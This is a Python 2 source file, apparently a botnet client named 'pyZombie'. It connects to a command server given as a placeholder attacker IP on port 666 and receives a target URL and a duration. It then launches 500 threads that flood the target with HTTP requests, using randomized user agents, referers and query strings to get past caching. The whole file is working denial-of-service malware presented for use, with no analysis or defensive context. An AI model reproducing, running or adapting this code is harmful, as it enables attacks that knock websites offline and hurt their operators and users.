import urllib2, threading, random, re, time, socket #1

#global params #2
headers_useragents=[]
headers_referers=[]

# generates a user agent array
def useragent_list(): #3
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return(headers_useragents)

# generates a referer array
def referer_list(): #4
    global headers_referers
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://' + host + '/')
    return(headers_referers)

#builds random ascii string
def buildblock(size): #5
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return(out_str)

#http request
def httpcall(url): #6
    useragent_list()
    referer_list()
    code=0
    if url.count("?")>0:
        param_joiner="&"
    else:
        param_joiner="?"
    request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
    request.add_header('Keep-Alive', random.randint(110,120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host',host)
    try: #7
        urllib2.urlopen(request) #8
    except: #9
        pass

#http caller thread
class HTTPThread(threading.Thread): #10
    def run(self):
        try:
            while time.time() <  tempo_maximo: #11
                httpcall(url) #12
        except:
            pass

#execute
while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('IP_do_atacante', 666))
        while True:
            data = sock.recv(1024) #13
            url = data[:data.find('|')] #14
            if url.count("/") == 2: #15
                url = url + "/" #16
            m = re.search('http\://([^/]*)/?.*', url) #17
            host = m.group(1) #18
            tempo = data[data.rfind('|')+1:] #19
            tempo_maximo = time.time() + float(tempo) #20
            print 'pyZombie iniciado'
            for i in range(500): #21
                t = HTTPThread()
                t.start()
    except:
        pass